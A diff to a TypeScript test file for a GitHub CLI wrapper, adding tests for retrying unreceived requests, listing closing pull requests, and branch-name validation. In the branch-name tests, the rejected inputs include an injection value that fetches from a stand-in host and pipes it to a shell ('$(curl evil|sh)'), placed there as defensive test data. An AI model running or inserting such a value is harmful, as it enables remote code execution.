@@ -1,7 +1,11 @@
 // @effect-diagnostics nodeBuiltinImport:off
 import { assert, it } from "@effect/vitest";
 import * as Effect from "effect/Effect";
+import * as Fiber from "effect/Fiber";
 import * as Layer from "effect/Layer";
+import * as Logger from "effect/Logger";
+import * as Random from "effect/Random";
+import * as TestClock from "effect/testing/TestClock";
 import * as NodeFS from "node:fs";
 import * as NodePath from "node:path";
 import { describe } from "vite-plus/test";
@@ -26,6 +30,7 @@ import {
   MAX_DEPENDS_ON,
   MAX_FILE_BYTES,
   CLOSED_BY_QUERY,
+  CLOSING_PRS_QUERY,
   PR_FEEDBACK_QUERY,
   READY_BY_QUERY,
   REVIEW_PAGE_LIMIT,
@@ -37,6 +42,9 @@ import {
   type Feedback,
   type GitHubError,
   isNotFound,
+  isNotReceived,
+  isPlainRefName,
+  isSafeBranchName,
   makeGitHub,
 } from "./github.ts";
 
@@ -955,6 +963,37 @@ it("only a failure with HTTP 404 in stderr is not found", () => {
     new GitHubRateLimited({ args, stderr: "HTTP 404 API rate limit" }),
   ];
   for (const other of others) assert.isFalse(isNotFound(other), other._tag);
+});
+
+it("only a failure GitHub never received is not received", () => {
+  const args = ["api", "repos/rawphp/softfac/issues"];
+  const failed = (stderr: string) => new GitHubFailed({ args, status: 1, stderr });
+  assert.isTrue(
+    isNotReceived(failed('Get "https://api.github.com/x": net/http: TLS handshake timeout')),
+  );
+  assert.isTrue(
+    isNotReceived(
+      failed('Post "https://api.github.com/x": dial tcp 140.82.112.6:443: i/o timeout'),
+    ),
+  );
+  assert.isTrue(
+    isNotReceived(
+      failed('Get "https://api.github.com/x": dial tcp 1.2.3.4:443: connect: connection refused'),
+    ),
+  );
+  assert.isTrue(
+    isNotReceived(
+      failed('Get "https://api.github.com/x": dial tcp: lookup api.github.com: no such host'),
+    ),
+  );
+  const others: ReadonlyArray<GitHubError> = [
+    failed("HTTP 502: Bad Gateway (https://api.github.com/graphql)"),
+    failed("HTTP 404: Not Found"),
+    failed('Get "https://api.github.com/x": read tcp 10.0.0.2:5000->1.2.3.4:443: i/o timeout'),
+    new GitHubTimedOut({ args, seconds: 30 }),
+    new GitHubRateLimited({ args, stderr: "net/http: TLS handshake timeout" }),
+  ];
+  for (const other of others) assert.isFalse(isNotReceived(other), other._tag);
 });
 
 it.effect("a signal-killed gh is a failure with status -1", () =>
@@ -4123,6 +4162,213 @@ it.effect("closedBy refuses an answer it cannot read", () =>
   }),
 );
 
+/** One pull request as GitHub lists it: open, by the factory, on `main`, unless `over` says otherwise. */
+const listedPr = (
+  number: number,
+  over: Partial<{
+    state: string;
+    headRefName: string;
+    baseRefName: string;
+    isCrossRepository: boolean;
+    author: { login: string } | null;
+  }> = {},
+) =>
+  JSON.stringify({
+    number,
+    url: `https://github.com/rawphp/softfac/pull/${number}`,
+    state: "OPEN",
+    headRefName: `t3/pr-${number}`,
+    baseRefName: "main",
+    isCrossRepository: false,
+    author: { login: "rawphp" },
+    ...over,
+  });
+
+const closingReply = (nodes: string) =>
+  `{"data":{"repository":{"issue":{"closedByPullRequestsReferences":{"nodes":[${nodes}]}}}}}`;
+
+const PR_LIST_FIELDS = "number,url,headRefName,baseRefName,isCrossRepository,author";
+
+it.effect(
+  "openPullRequestsClosing lists the open pull requests that would close the issue, with one call",
+  () =>
+    Effect.gen(function* () {
+      // GitHub's `includeClosedPrs: false` still returns merged ones: only `OPEN` is kept.
+      const t = setup(
+        reply(
+          closingReply(
+            [
+              listedPr(12, { state: "MERGED" }),
+              listedPr(14, { headRefName: "t3/softfac-issue-6-1" }),
+              listedPr(13, { state: "CLOSED" }),
+              listedPr(15, { headRefName: "t3/fork", isCrossRepository: true }),
+              listedPr(16, { headRefName: "t3/nobody", baseRefName: "dev", author: null }),
+            ].join(","),
+          ),
+        ),
+      );
+      assert.deepStrictEqual(yield* t.ok(t.github.openPullRequestsClosing(6)), [
+        {
+          number: 14,
+          url: "https://github.com/rawphp/softfac/pull/14",
+          headRef: "t3/softfac-issue-6-1",
+          baseRef: "main",
+          crossRepository: false,
+          author: "rawphp",
+        },
+        {
+          number: 15,
+          url: "https://github.com/rawphp/softfac/pull/15",
+          headRef: "t3/fork",
+          baseRef: "main",
+          crossRepository: true,
+          author: "rawphp",
+        },
+        {
+          number: 16,
+          url: "https://github.com/rawphp/softfac/pull/16",
+          headRef: "t3/nobody",
+          baseRef: "dev",
+          crossRepository: false,
+          author: null,
+        },
+      ]);
+      assert.deepStrictEqual(t.calls(), [
+        [
+          "api",
+          "graphql",
+          "-f",
+          `query=${CLOSING_PRS_QUERY}`,
+          "-f",
+          "owner=rawphp",
+          "-f",
+          "name=softfac",
+          "-F",
+          "number=6",
+        ],
+      ]);
+    }),
+);
+
+it.effect("openPullRequestsClosing is empty when nothing would close the issue", () =>
+  Effect.gen(function* () {
+    const t = setup(reply(closingReply("")));
+    assert.deepStrictEqual(yield* t.ok(t.github.openPullRequestsClosing(6)), []);
+  }),
+);
+
+it.effect("openPullRequestsClosing refuses an answer it cannot read", () =>
+  Effect.gen(function* () {
+    for (const text of ["", "no", "{}", '{"data":{"repository":{"issue":null}}}']) {
+      const t = setup(reply(text));
+      const error = yield* t.err(t.github.openPullRequestsClosing(6));
+      assert.strictEqual(error._tag, "GitHubParse", text);
+    }
+  }),
+);
+
+const prListCall = (head: string) => [
+  "pr",
+  "list",
+  "--repo",
+  REPO,
+  "--state",
+  "open",
+  "--head",
+  head,
+  "--limit",
+  "100",
+  "--json",
+  PR_LIST_FIELDS,
+];
+
+it.effect(
+  "openPullRequestsOnHead lists the open pull requests from the branch, with the exact call",
+  () =>
+    Effect.gen(function* () {
+      // `gh pr list --json author` carries more than the login; a blank login is nobody.
+      const t = setup(
+        reply(
+          `[${listedPr(14, { headRefName: "t3code/abc" })},${JSON.stringify({
+            number: 15,
+            url: "https://github.com/rawphp/softfac/pull/15",
+            headRefName: "t3code/abc",
+            baseRefName: "dev",
+            isCrossRepository: true,
+            author: { id: "", is_bot: false, login: "", name: "" },
+          })}]`,
+        ),
+      );
+      assert.deepStrictEqual(yield* t.ok(t.github.openPullRequestsOnHead("t3code/abc")), [
+        {
+          number: 14,
+          url: "https://github.com/rawphp/softfac/pull/14",
+          headRef: "t3code/abc",
+          baseRef: "main",
+          crossRepository: false,
+          author: "rawphp",
+        },
+        {
+          number: 15,
+          url: "https://github.com/rawphp/softfac/pull/15",
+          headRef: "t3code/abc",
+          baseRef: "dev",
+          crossRepository: true,
+          author: null,
+        },
+      ]);
+      assert.deepStrictEqual(t.calls(), [prListCall("t3code/abc")]);
+    }),
+);
+
+it.effect("openPullRequestsOnHead is empty when the branch has none", () =>
+  Effect.gen(function* () {
+    const t = setup(reply("[]"));
+    assert.deepStrictEqual(yield* t.ok(t.github.openPullRequestsOnHead("t3code/abc")), []);
+  }),
+);
+
+it.effect(
+  "openPullRequestsOnHead refuses a branch name that could be taken for an option, before calling gh",
+  () =>
+    Effect.gen(function* () {
+      for (const head of ["-x", "--force", "a b", "a..b", "", "a\u0001b"]) {
+        const t = setup(reply("[]"));
+        const error = yield* t.err(t.github.openPullRequestsOnHead(head));
+        assert.strictEqual(error._tag, "GitHubInvalidArgument", JSON.stringify(head));
+        assert.deepStrictEqual(t.calls(), [], JSON.stringify(head));
+      }
+    }),
+);
+
+describe("the branch-name rules", () => {
+  it("keep a plain ref name safe as one argument to git", () => {
+    for (const name of ["t3code/abc", "feat/x;y", "t3/x`y`"]) assert.isTrue(isPlainRefName(name));
+    for (const name of ["", "-x", "--force", "a b", "a..b", "a\u0001b", "a\tb"]) {
+      assert.isFalse(isPlainRefName(name), JSON.stringify(name));
+    }
+  });
+
+  it("let only an ordinary branch name into a command a session runs", () => {
+    for (const name of ["t3code/abc", "t3/2e8db933", "feat/x_y-z.1"]) {
+      assert.isTrue(isSafeBranchName(name), name);
+    }
+    for (const name of ["", "-x", "a b", "a..b", "feat/x;y", "t3/x`y`", "t3/x;$(curl evil|sh)"]) {
+      assert.isFalse(isSafeBranchName(name), JSON.stringify(name));
+    }
+  });
+});
+
+it.effect("openPullRequestsOnHead refuses an answer it cannot read", () =>
+  Effect.gen(function* () {
+    for (const text of ["", "no", "{}", '[{"number":"x"}]']) {
+      const t = setup(reply(text));
+      const error = yield* t.err(t.github.openPullRequestsOnHead("t3code/abc"));
+      assert.strictEqual(error._tag, "GitHubParse", text);
+    }
+  }),
+);
+
 const dropOf = (id: string, reason: DropReason): Dropped => ({ id, reason });
 const argsOf = (error: GitHubError): ReadonlyArray<string> => ("args" in error ? error.args : []);
 
@@ -6192,6 +6438,249 @@ describe("pr feedback", () => {
         ),
       );
       assert.strictEqual(garbled._tag, "GitHubParse");
+    }),
+  );
+});
+
+describe("retrying a call GitHub never received", () => {
+  const TLS =
+    'Get "https://api.github.com/repos/rawphp/softfac/issues": net/http: TLS handshake timeout';
+  const DIAL_TIMEOUT =
+    'Post "https://api.github.com/graphql": dial tcp 140.82.112.6:443: i/o timeout';
+  const REFUSED =
+    'Get "https://api.github.com/x": dial tcp 140.82.112.6:443: connect: connection refused';
+  const NO_HOST = 'Get "https://api.github.com/x": dial tcp: lookup api.github.com: no such host';
+
+  it.effect("a TLS handshake timeout is retried and the second attempt's answer is returned", () =>
+    Effect.gen(function* () {
+      const logs: Array<{ level: string; text: string }> = [];
+      const capture = Logger.make(({ logLevel, message }) => {
+        const first = Array.isArray(message) ? message[0] : message;
+        logs.push({ level: logLevel, text: String(first) });
+      });
+      const t = setup(fail(1, TLS), reply(LIST_ONE));
+      const fiber = yield* Effect.forkChild(
+        t
+          .ok(t.github.listIssues("ready"))
+          .pipe(Effect.provide(Logger.layer([capture], { mergeWithExisting: false }))),
+        { startImmediately: true },
+      );
+      yield* TestClock.adjust("3 seconds");
+      const listing = yield* Fiber.join(fiber);
+      assert.strictEqual(listing.items.length, 1);
+      assert.strictEqual(t.inputs.length, 2);
+      assert.deepEqual(t.calls()[0], t.calls()[1]);
+      // One info line names the redacted command, the attempt and the reason; nothing louder.
+      assert.strictEqual(logs.length, 1);
+      assert.strictEqual(logs[0]!.level, "Info");
+      assert.match(
+        logs[0]!.text,
+        /^`gh issue list --repo rawphp\/softfac .*` attempt 1 of 5 failed \(TLS handshake timeout\); trying again in [23]\.\d s$/,
+      );
+    }),
+  );
+
+  it.effect("each dial failure is retried too", () =>
+    Effect.gen(function* () {
+      for (const stderr of [DIAL_TIMEOUT, REFUSED, NO_HOST]) {
+        const t = setup(fail(1, stderr), reply(LIST_ONE));
+        const fiber = yield* Effect.forkChild(t.ok(t.github.listIssues("ready")), {
+          startImmediately: true,
+        });
+        yield* TestClock.adjust("3 seconds");
+        yield* Fiber.join(fiber);
+        assert.strictEqual(t.inputs.length, 2, stderr);
+      }
+    }),
+  );
+
+  it.effect(
+    "four TLS handshake timeouts then an answer: the call succeeds after four logged retries",
+    () =>
+      Effect.gen(function* () {
+        const logs: Array<string> = [];
+        const capture = Logger.make(({ message }) => {
+          logs.push(String(Array.isArray(message) ? message[0] : message));
+        });
+        const t = setup(fail(1, TLS), fail(1, TLS), fail(1, TLS), fail(1, TLS), reply(LIST_ONE));
+        const fiber = yield* Effect.forkChild(
+          t
+            .ok(t.github.listIssues("ready"))
+            .pipe(Effect.provide(Logger.layer([capture], { mergeWithExisting: false }))),
+          { startImmediately: true },
+        );
+        yield* TestClock.adjust(2_000 + 5_000 + 15_000 + 30_000 + 4_000);
+        const listing = yield* Fiber.join(fiber);
+        assert.strictEqual(listing.items.length, 1);
+        assert.strictEqual(t.inputs.length, 5);
+        assert.strictEqual(logs.length, 4);
+        logs.forEach((line, index) => {
+          assert.match(
+            line,
+            new RegExp(
+              `attempt ${index + 1} of 5 failed \\(TLS handshake timeout\\); trying again in \\d+\\.\\d s$`,
+            ),
+          );
+        });
+      }),
+  );
+
+  it.effect("five failed attempts return the last failure unchanged", () =>
+    Effect.gen(function* () {
+      const t = setup(
+        fail(1, TLS),
+        fail(1, DIAL_TIMEOUT),
+        fail(1, TLS),
+        fail(1, TLS),
+        fail(1, "fifth: " + TLS),
+      );
+      const fiber = yield* Effect.forkChild(t.err(t.github.listIssues("ready")), {
+        startImmediately: true,
+      });
+      yield* TestClock.adjust(2_000 + 5_000 + 15_000 + 30_000 + 4_000);
+      const error = yield* Fiber.join(fiber);
+      assert.strictEqual(t.inputs.length, 5);
+      assert.strictEqual(error._tag, "GitHubFailed");
+      if (error._tag !== "GitHubFailed") return;
+      assert.strictEqual(error.status, 1);
+      assert.strictEqual(error.stderr, "fifth: " + TLS);
+    }),
+  );
+
+  it.effect("the retries wait 2, 5, 15 then 30 s, each plus the jitter drawn for it", () =>
+    Effect.gen(function* () {
+      // The wrapper draws one jitter per retry; the same seed here gives the same four draws.
+      const seed = "retry-jitter";
+      const draws = yield* Effect.all([
+        Random.nextIntBetween(0, 1000),
+        Random.nextIntBetween(0, 1000),
+        Random.nextIntBetween(0, 1000),
+        Random.nextIntBetween(0, 1000),
+      ]).pipe(Random.withSeed(seed));
+      assert.ok(
+        draws.every((draw) => draw > 0),
+        `draws ${draws.join(", ")}: pick another seed`,
+      );
+      const t = setup(fail(1, TLS), fail(1, TLS), fail(1, TLS), fail(1, TLS), reply(LIST_ONE));
+      const fiber = yield* Effect.forkChild(
+        t.ok(t.github.listIssues("ready")).pipe(Random.withSeed(seed)),
+        { startImmediately: true },
+      );
+      assert.strictEqual(t.inputs.length, 1);
+      const delays = [2_000, 5_000, 15_000, 30_000];
+      for (const [index, delay] of delays.entries()) {
+        yield* TestClock.adjust(delay + draws[index]! - 1);
+        assert.strictEqual(t.inputs.length, index + 1);
+        yield* TestClock.adjust(1);
+        assert.strictEqual(t.inputs.length, index + 2);
+      }
+      yield* Fiber.join(fiber);
+      for (const input of t.inputs) assert.strictEqual(input.timeoutMs, 60_000);
+    }),
+  );
+
+  it.effect("a failure GitHub may have applied is not retried", () =>
+    Effect.gen(function* () {
+      const stderrs = [
+        "HTTP 502: Bad Gateway (https://api.github.com/graphql)",
+        'Post "https://api.github.com/graphql": unexpected EOF',
+        'Get "https://api.github.com/x": read tcp 10.0.0.2:5000->140.82.112.6:443: read: connection reset by peer',
+        'Get "https://api.github.com/x": read tcp 10.0.0.2:5000->140.82.112.6:443: i/o timeout',
+        "HTTP 404: Not Found",
+      ];
+      for (const stderr of stderrs) {
+        const t = setup(fail(1, stderr), reply(LIST_ONE));
+        const error = yield* t.err(t.github.listIssues("ready"));
+        assert.strictEqual(error._tag, "GitHubFailed", stderr);
+        assert.strictEqual(t.inputs.length, 1, stderr);
+      }
+    }),
+  );
+
+  it.effect("a rate limit and a timed-out call are not retried", () =>
+    Effect.gen(function* () {
+      // Even when its stderr also carries a not-received phrase: the rate limit decides.
+      const limited = setup(
+        fail(1, "net/http: TLS handshake timeout\nHTTP 429: API rate limit exceeded"),
+        reply(LIST_ONE),
+      );
+      assert.strictEqual(
+        (yield* limited.err(limited.github.listIssues("ready")))._tag,
+        "GitHubRateLimited",
+      );
+      assert.strictEqual(limited.inputs.length, 1);
+      const slow = setup(timedOut(), reply(LIST_ONE));
+      assert.strictEqual((yield* slow.err(slow.github.listIssues("ready")))._tag, "GitHubTimedOut");
+      assert.strictEqual(slow.inputs.length, 1);
+    }),
+  );
+
+  it.effect("the retry log line shows a comment body as its size, not its text", () =>
+    Effect.gen(function* () {
+      const texts: Array<string> = [];
+      const capture = Logger.make(({ message }) => {
+        texts.push(String(Array.isArray(message) ? message[0] : message));
+      });
+      const t = setup(fail(1, TLS), reply(""));
+      const fiber = yield* Effect.forkChild(
+        t
+          .ok(t.github.commentOnPr(5, "a hidden review body"))
+          .pipe(Effect.provide(Logger.layer([capture], { mergeWithExisting: false }))),
+        { startImmediately: true },
+      );
+      yield* TestClock.adjust("3 seconds");
+      yield* Fiber.join(fiber);
+      assert.strictEqual(t.inputs.length, 2);
+      assert.strictEqual(texts.length, 1);
+      assert.match(
+        texts[0]!,
+        /^`gh pr comment 5 --repo rawphp\/softfac --body <\d+ bytes>` attempt 1/,
+      );
+      assert.notInclude(texts[0]!, "hidden review body");
+    }),
+  );
+
+  it.effect("a claim whose edit GitHub never received views the assignees again first", () =>
+    Effect.gen(function* () {
+      const edit = editCall(
+        "--add-assignee",
+        "rawphp",
+        "--remove-label",
+        "factory:ready",
+        "--add-label",
+        "factory:triage",
+      );
+      const view = ["issue", "view", "6", "--repo", REPO, "--json", "assignees"];
+      // Another machine claimed the issue while this one waited to try again.
+      const lost = setup(
+        reply('{"assignees":[]}'),
+        fail(1, TLS),
+        reply('{"assignees":[{"login":"b"}]}'),
+      );
+      const lostFiber = yield* Effect.forkChild(
+        lost.ok(lost.github.claim(6, "rawphp", "ready", "triage")),
+        { startImmediately: true },
+      );
+      yield* TestClock.adjust("3 seconds");
+      assert.deepStrictEqual(yield* Fiber.join(lostFiber), {
+        kind: "skipped-assigned",
+        assignees: ["b"],
+      });
+      assert.deepStrictEqual(lost.calls(), [view, edit, view]);
+      // Nobody did, so the second attempt claims it.
+      const won = setup(
+        reply('{"assignees":[]}'),
+        fail(1, TLS),
+        reply('{"assignees":[]}'),
+        reply(""),
+      );
+      const wonFiber = yield* Effect.forkChild(
+        won.ok(won.github.claim(6, "rawphp", "ready", "triage")),
+        { startImmediately: true },
+      );
+      yield* TestClock.adjust("3 seconds");
+      assert.deepStrictEqual(yield* Fiber.join(wonFiber), { kind: "claimed" });
+      assert.deepStrictEqual(won.calls(), [view, edit, view, edit]);
     }),
   );
 });
